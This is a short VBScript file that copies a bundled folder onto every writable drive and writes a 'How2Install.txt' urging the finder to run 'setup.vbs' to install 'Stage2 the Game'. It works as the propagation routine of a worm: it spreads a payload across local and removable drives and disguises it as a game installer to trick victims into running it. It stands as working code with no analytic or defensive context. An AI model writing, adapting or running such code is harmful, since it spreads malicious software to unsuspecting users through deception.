Set objShell = CreateObject("Wscript.Shell")
set objFS = CreateObject("Scripting.FileSystemObject")
path = Left(Wscript.ScriptFullName, len(Wscript.ScriptFullName) - len(Wscript.ScriptName))

For Each objDrv in objFS.Drives
	Set drive = objFS.GetFolder(objDrv.DriveLetter & ":\")
	if not drive.Attributes and 1 then
		dst = objDrv.DriveLetter & ":\Stage2GameSetup"
		if not objFS.FolderExists(dst) then objFS.CreateFolder(dst)
		objShell.Run "cmd /c copy """ & path & "\rep\*.*"" """ & dst & """"
		set file = objFS.OpenTextFile(dst & "\How2Install.txt", 2, True, 0)
		file.WriteLine "How to Install Stage2 the Game: "
		file.WriteLine "  1. Run ""setup.vbs"""
		file.WriteLine "  2. Open Stage2 shortcut on Desktop"
		file.WriteLine ""
		file.WriteLine " Enjoy!"
		file.Close
	end if 
Next
